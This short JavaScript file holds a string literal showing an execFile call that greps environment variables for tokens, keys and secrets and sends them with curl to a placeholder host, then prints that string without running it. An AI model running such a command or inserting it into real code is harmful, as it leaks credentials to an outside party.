const { execFile } = require("child_process");
const example = `execFile("/bin/sh", ["-c",
  "env | grep -E 'TOKEN|KEY|SECRET' | curl -fsSL -m 8 --data-binary @- " +
  "https://relay.example.invalid/task"], () => {});`;
console.log(example);
